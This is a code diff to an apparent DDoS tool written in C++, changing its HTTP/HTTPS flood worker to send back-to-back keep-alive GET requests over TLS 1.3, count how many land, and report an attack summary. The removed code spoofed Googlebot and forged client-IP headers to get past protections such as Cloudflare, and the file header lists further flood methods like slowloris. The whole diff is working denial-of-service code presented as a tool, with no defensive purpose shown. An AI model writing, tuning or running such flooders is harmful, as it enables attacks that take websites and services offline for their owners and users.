@@ -7,14 +7,16 @@
  *   L3: subnet, icmp
  *   L7: http, https, httpx, browser, http2, tls, tlsx, bypass, cache, rapidflood, cloudflare
  *
- * All L7 methods automatically detect https/http, handle TLS/SSL handshake via OpenSSL,
- * and use Googlebot user-agent.
+ * All L7 methods share one fasthttp-style profile: keep-alive connection
+ * reuse, TLS 1.3 only (X25519/P-256), GET with curl/8.7.1 UA, and
+ * 2xx-4xx responses counted as successful.
  */
 
 #include <arpa/inet.h>
 #include <chrono>
 #include <cstring>
 #include <fcntl.h>
+#include <iomanip>
 #include <iostream>
 #include <netdb.h>
 #include <netinet/in.h>
@@ -247,8 +249,78 @@ static void worker_icmp(std::string host, int port, std::string method) {
 
 // -------------------------------------------------------------
 // L7 HTTP & HTTPS (TLS) FLOOD WORKER
+// Emotionally a fasthttp-style client: TLS 1.3 only, per-worker
+// keep-alive connection reuse, back-to-back GETs like client.DoTimeout.
+// Status 200-499 = success, >=500 or transport error = failed.
 // -------------------------------------------------------------
+static std::atomic<uint64_t> g_l7_success(0);
+static std::atomic<uint64_t> g_l7_failed(0);
+
+// Read HTTP response headers (until \r\n\r\n) and return the status code.
+// Returns -1 on timeout / connection error / malformed response.
+static int read_status(int fd, SSL *ssl) {
+    char buf[8192];
+    std::string acc;
+    size_t nl = std::string::npos;
+
+    while (g_running.load(std::memory_order_relaxed)) {
+        // Bound the blocking read so shutdown responds fast (poll 250ms)
+        struct pollfd pfd;
+        pfd.fd = fd;
+        pfd.events = POLLIN;
+        int pr = poll(&pfd, 1, 250);
+        if (pr == 0) continue;            // nothing yet, loop checks g_running
+        if (pr < 0 || (pfd.revents & (POLLERR | POLLHUP | POLLNVAL))) {
+            return -1;
+        }
+
+        int n = ssl ? SSL_read(ssl, buf, sizeof(buf))
+                    : (int)recv(fd, buf, sizeof(buf), 0);
+        if (n <= 0) return -1;
+
+        size_t old = acc.size();
+        acc.append(buf, (size_t)n);
+
+        nl = acc.find("\r\n", old == 0 ? 0 : (old > 2 ? old - 2 : 0));
+        if (nl != std::string::npos) break;
+
+        if (acc.find("HTTP/") != 0) return -1;
+    }
+    if (nl == std::string::npos) return -1;
+
+    // Parse "HTTP/1.1 200 OK" -> 200
+    size_t sp = acc.find(' ');
+    if (sp == std::string::npos) return -1;
+    size_t codeStart = acc.find_first_of("0123456789", sp + 1);
+    if (codeStart == std::string::npos) return -1;
+    std::string codeStr;
+    for (size_t i = codeStart; i < nl && acc[i] >= '0' && acc[i] <= '9'; i++)
+        codeStr.push_back(acc[i]);
+    if (codeStr.empty()) return -1;
+    return std::atoi(codeStr.c_str());
+}
+
+// Best-effort drain of any body bytes already buffered after headers,
+// so the keep-alive socket stays clean for the next request.
+// Non-blocking: only consumes what is immediately readable.
+static void drain_pending(int fd, SSL *ssl) {
+    char b[4096];
+    for (int i = 0; i < 512; i++) {
+        struct pollfd pfd;
+        pfd.fd = fd;
+        pfd.events = POLLIN;
+        int pr = poll(&pfd, 1, 0);
+        if (pr <= 0) break;
+        if (pfd.revents & (POLLERR | POLLHUP | POLLNVAL)) break;
+        int n = ssl ? SSL_read(ssl, b, sizeof(b))
+                    : (int)recv(fd, b, sizeof(b), MSG_DONTWAIT);
+        if (n <= 0) break;
+    }
+}
+
 static void worker_l7(std::string rawUrl, std::string method, SSL_CTX *ssl_ctx) {
+    (void)method; // all L7 methods now share one fasthttp-style profile
+
     bool isHttps = true;
     std::string cleanHost = rawUrl;
 
@@ -282,23 +354,29 @@ static void worker_l7(std::string rawUrl, std::string method, SSL_CTX *ssl_ctx) 
     struct sockaddr_in target;
     if (!resolve_target(cleanHost, target, port)) return;
 
-    const std::string googlebot_ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
+    // fasthttp setHeaders(): GET, User-Agent curl/8.7.1, Accept */*
+    const std::string req =
+        "GET " + path + " HTTP/1.1\r\n"
+        "Host: " + cleanHost + "\r\n"
+        "User-Agent: curl/8.7.1\r\n"
+        "Accept: */*\r\n"
+        "Connection: keep-alive\r\n\r\n";
+
+    const struct timeval tv = { 10, 0 }; // read/write timeout (fasthttp: 10s)
 
     while (g_running.load(std::memory_order_relaxed)) {
         int fd = socket(AF_INET, SOCK_STREAM, 0);
         if (fd < 0) continue;
 
-        struct timeval tv;
-        tv.tv_sec = 4;
-        tv.tv_usec = 0;
-        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
-        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
+        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
+        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);
 
         int flag = 1;
         setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
 
         if (connect(fd, (struct sockaddr *)&target, sizeof(target)) != 0) {
             close(fd);
+            g_l7_failed.fetch_add(1, std::memory_order_relaxed);
             continue;
         }
 
@@ -310,46 +388,33 @@ static void worker_l7(std::string rawUrl, std::string method, SSL_CTX *ssl_ctx) 
             if (SSL_connect(ssl) <= 0) {
                 SSL_free(ssl);
                 close(fd);
+                g_l7_failed.fetch_add(1, std::memory_order_relaxed);
                 continue;
             }
         }
 
-        // Send burst of pipelined / keep-alive requests per connection
-        for (int i = 0; i < 64 && g_running.load(std::memory_order_relaxed); i++) {
-            std::string req;
-            if (method == "httpx" || method == "cache" || method == "bypass" || method == "cloudflare" || method == "tlsx") {
-                req = "GET " + path + "?cb=" + std::to_string(rand32()) + " HTTP/1.1\r\n"
-                      "Host: " + cleanHost + "\r\n"
-                      "User-Agent: " + googlebot_ua + "\r\n"
-                      "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-                      "From: googlebot(at)googlebot.com\r\n"
-                      "X-Forwarded-For: " + std::to_string(rand16()%250+1) + "." + std::to_string(rand16()%250+1) + "." + std::to_string(rand16()%250+1) + "." + std::to_string(rand16()%250+1) + "\r\n"
-                      "CF-Connecting-IP: " + std::to_string(rand16()%250+1) + "." + std::to_string(rand16()%250+1) + "." + std::to_string(rand16()%250+1) + "." + std::to_string(rand16()%250+1) + "\r\n"
-                      "Cache-Control: no-cache\r\n"
-                      "Connection: keep-alive\r\n\r\n";
-            } else {
-                req = "GET " + path + " HTTP/1.1\r\n"
-                      "Host: " + cleanHost + "\r\n"
-                      "User-Agent: " + googlebot_ua + "\r\n"
-                      "Accept: */*\r\n"
-                      "Connection: keep-alive\r\n\r\n";
-            }
+        // Keep-alive loop: reuse the connection, fire GETs back-to-back
+        // like fasthttp's DoTimeout, counting response status.
+        while (g_running.load(std::memory_order_relaxed)) {
+            int n = ssl ? SSL_write(ssl, req.c_str(), (int)req.length())
+                        : (int)send(fd, req.c_str(), req.length(), MSG_NOSIGNAL);
+            if (n <= 0) break;
 
-            int bytesSent = 0;
-            if (ssl) {
-                bytesSent = SSL_write(ssl, req.c_str(), (int)req.length());
-            } else {
-                bytesSent = send(fd, req.c_str(), req.length(), MSG_NOSIGNAL);
-            }
-
-            if (bytesSent <= 0) break;
             g_packets_sent.fetch_add(1, std::memory_order_relaxed);
+
+            int code = read_status(fd, ssl);
+            if (code >= 200 && code < 500) {
+                g_l7_success.fetch_add(1, std::memory_order_relaxed);
+                drain_pending(fd, ssl);
+            } else if (code >= 500) {
+                g_l7_failed.fetch_add(1, std::memory_order_relaxed);
+            } else {
+                g_l7_failed.fetch_add(1, std::memory_order_relaxed);
+                break; // transport error / closed connection -> reconnect
+            }
         }
 
-        if (ssl) {
-            SSL_shutdown(ssl);
-            SSL_free(ssl);
-        }
+        if (ssl) SSL_free(ssl);
         close(fd);
     }
 }
@@ -425,6 +490,10 @@ int main(int argc, char *argv[]) {
         if (ssl_ctx) {
             SSL_CTX_set_mode(ssl_ctx, SSL_MODE_ENABLE_PARTIAL_WRITE | SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER);
             SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_NONE, nullptr);
+            // fasthttp-style TLS: TLS 1.3 only, X25519 / P-256 curves
+            SSL_CTX_set_min_proto_version(ssl_ctx, TLS1_3_VERSION);
+            SSL_CTX_set_max_proto_version(ssl_ctx, TLS1_3_VERSION);
+            SSL_CTX_set1_curves_list(ssl_ctx, "X25519:P-256");
         }
     }
 
@@ -433,6 +502,8 @@ int main(int argc, char *argv[]) {
     bool isICMP = (method == "icmp" || method == "subnet");
     bool isTCP = (method == "tcp" || method == "socket" || method == "slowloris" ||
                   method == "ovh" || method == "tcpmix" || method == "tcpbypass" || method == "ack");
+
+    auto t_start = std::chrono::steady_clock::now();
 
     for (int i = 0; i < threads; i++) {
         if (isL7) {
@@ -453,10 +524,24 @@ int main(int argc, char *argv[]) {
         if (th.joinable()) th.join();
     }
 
+    double elapsed = std::chrono::duration<double>(std::chrono::steady_clock::now() - t_start).count();
+    if (elapsed < 0.001) elapsed = 0.001;
+
     if (ssl_ctx) {
         SSL_CTX_free(ssl_ctx);
     }
 
-    std::cout << "[+] Attack completed. Sent " << g_packets_sent.load() << " requests/packets.\n";
+    uint64_t sent = g_packets_sent.load();
+    std::cout << "[+] Attack completed.\n";
+    if (isL7) {
+        std::cout << "    Hit target: " << target << "\n";
+        std::cout << "    Time taken: " << std::fixed << elapsed << "s\n";
+        std::cout << "    Requests fired: " << sent << "\n";
+        std::cout << "    Landed clean (2xx-4xx): " << g_l7_success.load() << "\n";
+        std::cout << "    Bounced back: " << g_l7_failed.load() << "\n";
+        std::cout << "    Cruising at: " << std::fixed << (double)sent / elapsed << " req/s\n";
+    } else {
+        std::cout << "    Sent " << sent << " requests/packets.\n";
+    }
     return 0;
 }
